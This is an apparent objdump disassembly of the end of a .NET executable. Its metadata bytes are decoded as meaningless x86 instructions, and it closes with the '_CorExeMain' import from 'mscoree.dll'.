  40c983:	04 07                	add    $0x7,%al
  40c985:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c98b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c990:	04 1d                	add    $0x1d,%al
  40c992:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c997:	06                   	push   %es
  40c998:	07                   	pop    %es
  40c999:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c99f:	00 01                	add    %al,(%ecx)
  40c9a1:	1d 05 0b 1c 07       	sbb    $0x71c0b05,%eax
  40c9a6:	0c 12                	or     $0x12,%al
  40c9a8:	81 7d 1d 05 1d 05 0e 	cmpl   $0xe051d05,0x1d(%ebp)
  40c9af:	08 1d 12 41 08 12    	or     %bl,0x12084112
  40c9b5:	41                   	inc    %ecx
  40c9b6:	12 41 12             	adc    0x12(%ecx),%al
  40c9b9:	81 81 12 81 85 12 81 	addl   $0x48981,0x12858112(%ecx)
  40c9c0:	89 04 00 
  40c9c3:	00 12                	add    %dl,(%edx)
  40c9c5:	41                   	inc    %ecx
  40c9c6:	05 20 00 12 81       	add    $0x81120020,%eax
  40c9cb:	91                   	xchg   %eax,%ecx
  40c9cc:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c9d1:	41                   	inc    %ecx
  40c9d2:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c9d7:	0e                   	push   %cs
  40c9d8:	06                   	push   %es
  40c9d9:	20 01                	and    %al,(%ecx)
  40c9db:	01 11                	add    %edx,(%ecx)
  40c9dd:	81 99 06 20 01 01 12 	sbbl   $0x4818112,0x1012006(%ecx)
  40c9e4:	81 81 04 
  40c9e7:	06                   	push   %es
  40c9e8:	12 81 85 09 20 02    	adc    0x2200985(%ecx),%al
  40c9ee:	12 81 85 0e 11 81    	adc    -0x7eeef17b(%ecx),%al
  40c9f4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c9f5:	06                   	push   %es
  40c9f6:	00 03                	add    %al,(%ebx)
  40c9f8:	0e                   	push   %cs
  40c9f9:	0e                   	push   %cs
  40c9fa:	0e                   	push   %cs
  40c9fb:	0e                   	push   %cs
  40c9fc:	05 20 02 01 0e       	add    $0xe010220,%eax
  40ca01:	1c 07                	sbb    $0x7,%al
  40ca03:	00 01                	add    %al,(%ecx)
  40ca05:	12 41 12             	adc    0x12(%ecx),%al
  40ca08:	81 81 04 07 02 0a 02 	addl   $0x6071002,0xa020704(%ecx)
  40ca0f:	10 07 06 
  40ca12:	12 81 b5 12 81 b9    	adc    -0x467eed4b(%ecx),%al
  40ca18:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40ca1e:	0e                   	push   %cs
  40ca1f:	02 05 20 00 12 81    	add    0x81120020,%al
  40ca25:	b9 05 20 00 12       	mov    $0x12002005,%ecx
  40ca2a:	81 bd 05 20 00 12 81 	cmpl   $0x2004c181,0x12002005(%ebp)
  40ca31:	c1 04 20 
  40ca34:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40ca37:	04 07                	add    $0x7,%al
  40ca39:	02 02                	add    (%edx),%al
  40ca3b:	02 03                	add    (%ebx),%al
  40ca3d:	20 00                	and    %al,(%eax)
  40ca3f:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40ca42:	02 18                	add    (%eax),%bl
  40ca44:	02 09                	add    (%ecx),%cl
  40ca46:	07                   	pop    %es
  40ca47:	04 1d                	add    $0x1d,%al
  40ca49:	12 41 08             	adc    0x8(%ecx),%al
  40ca4c:	12 41 0e             	adc    0xe(%ecx),%al
  40ca4f:	0a 07                	or     (%edi),%al
  40ca51:	04 12                	add    $0x12,%al
  40ca53:	81 b5 08 12 81 b9 0e 	xorl   $0x1100c0e,-0x467eedf8(%ebp)
  40ca5a:	0c 10 01 
  40ca5d:	01 15 12 81 d1 01    	add    %edx,0x1d18112
  40ca63:	1e                   	push   %ds
  40ca64:	00 12                	add    %dl,(%edx)
  40ca66:	35 05 0a 01 12       	xor    $0x12010a05,%eax
  40ca6b:	81 c1 0c 10 01 01    	add    $0x101100c,%ecx
  40ca71:	1e                   	push   %ds
  40ca72:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40ca78:	1e                   	push   %ds
  40ca79:	00 03                	add    %al,(%ebx)
  40ca7b:	07                   	pop    %es
  40ca7c:	01 0e                	add    %ecx,(%esi)
  40ca7e:	05 00 00 12 81       	add    $0x81120000,%eax
  40ca83:	d5 05                	aad    $0x5
  40ca85:	00 01                	add    %al,(%ecx)
  40ca87:	0e                   	push   %cs
  40ca88:	1d 1c 0b 07 05       	sbb    $0x5070b1c,%eax
  40ca8d:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40ca92:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40ca97:	20 02                	and    %al,(%edx)
  40ca99:	0e                   	push   %cs
  40ca9a:	08 08                	or     %cl,(%eax)
  40ca9c:	06                   	push   %es
  40ca9d:	07                   	pop    %es
  40ca9e:	02 02                	add    (%edx),%al
  40caa0:	11 81 55 05 20 02    	adc    %eax,0x2200555(%ecx)
  40caa6:	0e                   	push   %cs
  40caa7:	0e                   	push   %cs
  40caa8:	0e                   	push   %cs
  40caa9:	05 20 00 11 81       	add    $0x81110020,%eax
  40caae:	55                   	push   %ebp
  40caaf:	05 00 00 12 81       	add    $0x81120000,%eax
  40cab4:	e5 06                	in     $0x6,%eax
  40cab6:	20 01                	and    %al,(%ecx)
  40cab8:	01 12                	add    %edx,(%edx)
  40caba:	81 e5 06 20 01 02    	and    $0x2012006,%ebp
  40cac0:	11 81 ed 11 07 05    	adc    %eax,0x50711ed(%ecx)
  40cac6:	12 81 b5 15 12 31    	adc    0x311215b5(%ecx),%al
  40cacc:	01 0e                	add    %ecx,(%esi)
  40cace:	12 81 bd 12 81 c1    	adc    -0x3e7eed43(%ecx),%al
  40cad4:	0e                   	push   %cs
  40cad5:	05 15 12 31 01       	add    $0x1311215,%eax
  40cada:	0e                   	push   %cs
  40cadb:	05 20 00 1d 13       	add    $0x131d0020,%eax
  40cae0:	00 06                	add    %al,(%esi)
  40cae2:	00 02                	add    %al,(%edx)
  40cae4:	0e                   	push   %cs
  40cae5:	0e                   	push   %cs
  40cae6:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40caeb:	1d 12 45 08 12       	sbb    $0x12084512,%eax
  40caf0:	45                   	inc    %ebp
  40caf1:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40caf6:	45                   	inc    %ebp
  40caf7:	05 20 00 11 81       	add    $0x81110020,%eax
  40cafc:	f1                   	int1
  40cafd:	09 00                	or     %eax,(%eax)
  40caff:	02 02                	add    (%edx),%al
  40cb01:	11 81 f1 11 81 f1    	adc    %eax,-0xe7eee0f(%ecx)
  40cb07:	07                   	pop    %es
  40cb08:	20 03                	and    %al,(%ebx)
  40cb0a:	01 02                	add    %eax,(%edx)
  40cb0c:	0e                   	push   %cs
  40cb0d:	10 02                	adc    %al,(%edx)
  40cb0f:	06                   	push   %es
  40cb10:	00 01                	add    %al,(%ecx)
  40cb12:	01 12                	add    %edx,(%edx)
  40cb14:	81 f9 06 07 02 12    	cmp    $0x12020706,%ecx
  40cb1a:	81 85 02 08 20 03 01 	addl   $0x111c0e01,0x3200802(%ebp)
  40cb21:	0e 1c 11 
  40cb24:	82 01 06             	addb   $0x6,(%ecx)
  40cb27:	07                   	pop    %es
  40cb28:	02 12                	add    (%edx),%dl
  40cb2a:	81 85 0e 06 20 01 12 	addl   $0xe858112,0x120060e(%ebp)
  40cb31:	81 85 0e 
  40cb34:	07                   	pop    %es
  40cb35:	20 02                	and    %al,(%edx)
  40cb37:	12 81 85 0e 02 12    	adc    0x12020e85(%ecx),%al
  40cb3d:	07                   	pop    %es
  40cb3e:	06                   	push   %es
  40cb3f:	12 20                	adc    (%eax),%ah
  40cb41:	0e                   	push   %cs
  40cb42:	08 12                	or     %dl,(%edx)
  40cb44:	80 c9 15             	or     $0x15,%cl
  40cb47:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40cb4d:	12 20                	adc    (%eax),%ah
  40cb4f:	10 10                	adc    %dl,(%eax)
  40cb51:	01 01                	add    %eax,(%ecx)
  40cb53:	15 12 31 01 1e       	adc    $0x1e013112,%eax
  40cb58:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40cb5e:	1e                   	push   %ds
  40cb5f:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40cb62:	01 12                	add    %edx,(%edx)
  40cb64:	20 05 20 01 02 13    	and    %al,0x13020120
  40cb6a:	00 03                	add    %al,(%ebx)
  40cb6c:	07                   	pop    %es
  40cb6d:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  40cb74:	05 07 20 01 12       	add    $0x12012007,%eax
  40cb79:	82 09 1d             	orb    $0x1d,(%ecx)
  40cb7c:	05 06 20 01 12       	add    $0x12012006,%eax
  40cb81:	82 0d 0e 06 00 01 1c 	orb    $0x1c,0x100060e
  40cb88:	12 82 0d 08 00 01    	adc    0x100080d(%edx),%al
  40cb8e:	12 82 0d 11 82 15    	adc    0x1582110d(%edx),%al
  40cb94:	09 00                	or     %eax,(%eax)
  40cb96:	02 12                	add    (%edx),%dl
  40cb98:	82 19 11             	sbbb   $0x11,(%ecx)
  40cb9b:	82 1d 0e 1c 00 05 12 	sbbb   $0x12,0x5001c0e
  40cba2:	82 25 11 82 29 0e 15 	andb   $0x15,0xe298211
  40cba9:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cbaf:	0d 12 82 0d 15       	or     $0x150d8212,%eax
  40cbb4:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40cbba:	19 17                	sbb    %edx,(%edi)
  40cbbc:	15 12 55 01 15       	adc    $0x15015512,%eax
  40cbc1:	12 59 0a             	adc    0xa(%ecx),%bl
  40cbc4:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40cbc7:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40cbcd:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbd2:	0e                   	push   %cs
  40cbd3:	0b 00                	or     (%eax),%eax
  40cbd5:	01 15 12 55 01 13    	add    %edx,0x13015512
  40cbdb:	00 12                	add    %dl,(%edx)
  40cbdd:	82 25 03 06 13 00 13 	andb   $0x13,0x130603
  40cbe4:	15 12 59 0a 12       	adc    $0x120a5912,%eax
  40cbe9:	5d                   	pop    %ebp
  40cbea:	1c 12                	sbb    $0x12,%al
  40cbec:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cbf1:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40cbf6:	0e                   	push   %cs
  40cbf7:	17                   	pop    %ss
  40cbf8:	20 0a                	and    %cl,(%edx)
  40cbfa:	01 13                	add    %edx,(%ebx)
  40cbfc:	00 13                	add    %dl,(%ebx)
  40cbfe:	01 13                	add    %edx,(%ebx)
  40cc00:	02 13                	add    (%ebx),%dl
  40cc02:	03 13                	add    (%ebx),%edx
  40cc04:	04 13                	add    $0x13,%al
  40cc06:	05 13 06 13 07       	add    $0x7130613,%eax
  40cc0b:	13 08                	adc    (%eax),%ecx
  40cc0d:	13 09                	adc    (%ecx),%ecx
  40cc0f:	05 07 01 12 82       	add    $0x82120107,%eax
  40cc14:	2d 07 20 03 01       	sub    $0x1032007,%eax
  40cc19:	0e                   	push   %cs
  40cc1a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cc1f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cc25:	06                   	push   %es
  40cc26:	12 81 2d 12 82 39    	adc    0x3982122d(%ecx),%al
  40cc2c:	12 82 3d 12 82 41    	adc    0x4182123d(%edx),%al
  40cc32:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cc37:	20 01                	and    %al,(%ecx)
  40cc39:	01 11                	add    %edx,(%ecx)
  40cc3b:	82 4d 06 20          	orb    $0x20,0x6(%ebp)
  40cc3f:	01 01                	add    %eax,(%ecx)
  40cc41:	11 82 51 05 20 00    	adc    %eax,0x200551(%edx)
  40cc47:	12 82 55 0b 20 03    	adc    0x3200b55(%edx),%al
  40cc4d:	01 12                	add    %edx,(%edx)
  40cc4f:	39 12                	cmp    %edx,(%edx)
  40cc51:	82 55 11 82          	adcb   $0x82,0x11(%ebp)
  40cc55:	59                   	pop    %ecx
  40cc56:	08 20                	or     %ah,(%eax)
  40cc58:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cc5e:	08 1a                	or     %bl,(%edx)
  40cc60:	07                   	pop    %es
  40cc61:	0a 12                	or     (%edx),%dl
  40cc63:	81 2d 12 82 39 1d 05 	subl   $0x41821205,0x1d398212
  40cc6a:	12 82 41 
  40cc6d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cc72:	82 3d 1d 05 1d 05 1d 	cmpb   $0x1d,0x51d051d
  40cc79:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cc7e:	12 81 71 08 12 81    	adc    -0x7eedf78f(%ecx),%al
  40cc84:	71 08                	jno    0x40cc8e
  40cc86:	08 04 07             	or     %al,(%edi,%eax,1)
  40cc89:	02 02                	add    (%edx),%al
  40cc8b:	08 0e                	or     %cl,(%esi)
  40cc8d:	07                   	pop    %es
  40cc8e:	06                   	push   %es
  40cc8f:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40cc94:	12 82 65 1d 05 08    	adc    0x8051d65(%edx),%al
  40cc9a:	05 07 07 02 12       	add    $0x12020707,%eax
  40cc9f:	82 65 1d 05          	andb   $0x5,0x1d(%ebp)
  40cca3:	0f 07                	sysret
  40cca5:	06                   	push   %es
  40cca6:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40ccac:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40ccb2:	05 08 20 02 01       	add    $0x1022008,%eax
  40ccb7:	12 39                	adc    (%ecx),%bh
  40ccb9:	11 82 6d 0c 07 04    	adc    %eax,0x4070c6d(%edx)
  40ccbf:	12 81 2d 1d 05 12    	adc    0x12051d2d(%ecx),%al
  40ccc5:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40ccc9:	00 00                	add    %al,(%eax)
  40cccb:	00 f4                	add    %dh,%ah
  40cccd:	cc                   	int3
	...
  40ccd6:	00 00                	add    %al,(%eax)
  40ccd8:	0e                   	push   %cs
  40ccd9:	cd 00                	int    $0x0
  40ccdb:	00 00                	add    %al,(%eax)
  40ccdd:	20 00                	and    %al,(%eax)
	...
  40ccf3:	00 00                	add    %al,(%eax)
  40ccf5:	cd 00                	int    $0x0
	...
  40ccff:	00 00                	add    %al,(%eax)
  40cd01:	00 5f 43             	add    %bl,0x43(%edi)
  40cd04:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd05:	72 45                	jb     0x40cd4c
  40cd07:	78 65                	js     0x40cd6e
  40cd09:	4d                   	dec    %ebp
  40cd0a:	61                   	popa
  40cd0b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40cd12:	72 65                	jb     0x40cd79
  40cd14:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40cd18:	6c                   	insb   (%dx),%es:(%edi)
  40cd19:	00 00                	add    %al,(%eax)
  40cd1b:	00 00                	add    %al,(%eax)
  40cd1d:	00 ff                	add    %bh,%bh
  40cd1f:	25 00 20 40 00       	and    $0x402000,%eax
